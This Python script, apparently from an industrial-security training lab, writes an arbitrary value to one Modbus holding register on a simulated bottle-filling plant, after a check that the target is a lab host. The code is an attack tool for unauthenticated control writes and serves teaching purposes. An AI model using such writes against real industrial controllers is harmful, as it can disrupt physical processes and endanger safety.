#!/usr/bin/env python3
"""Write one holding register on bottle-filling plant.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 1.0.0
"""

from __future__ import annotations

import argparse
import logging
from typing import Final

from pymodbus.client import ModbusTcpClient

from lab_guard import LabTargetError, assert_lab_target


LOGGER: Final[logging.Logger] = logging.getLogger("attacks.set_registry")


def parse_args() -> argparse.Namespace:
    """Parse CLI arguments."""
    parser = argparse.ArgumentParser(description="Set one holding register value")
    parser.add_argument("--host", default="127.0.0.1", help="Modbus server host")
    parser.add_argument("--port", type=int, default=15020, help="Modbus TCP port")
    parser.add_argument("--hr", type=int, required=True, help="Holding register number (1..16)")
    parser.add_argument("--value", type=int, required=True, help="Raw register value (0..65535)")
    return parser.parse_args()


def main() -> int:
    """Entrypoint."""
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s %(message)s")
    args = parse_args()
    try:
        assert_lab_target(args.host)
    except LabTargetError as exc:
        LOGGER.error("%s", exc)
        return 2
    address = max(1, min(16, int(args.hr))) - 1
    value = max(0, min(65535, int(args.value)))

    client = ModbusTcpClient(host=args.host, port=args.port)
    if not client.connect():
        LOGGER.error("Unable to connect to %s:%s", args.host, args.port)
        return 1

    response = client.write_register(address=address, value=value, device_id=1)
    client.close()
    if response.isError():
        LOGGER.error("Write failed on HR[%04d]", address + 1)
        return 2

    LOGGER.info("HR[%04d] <- %s", address + 1, value)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
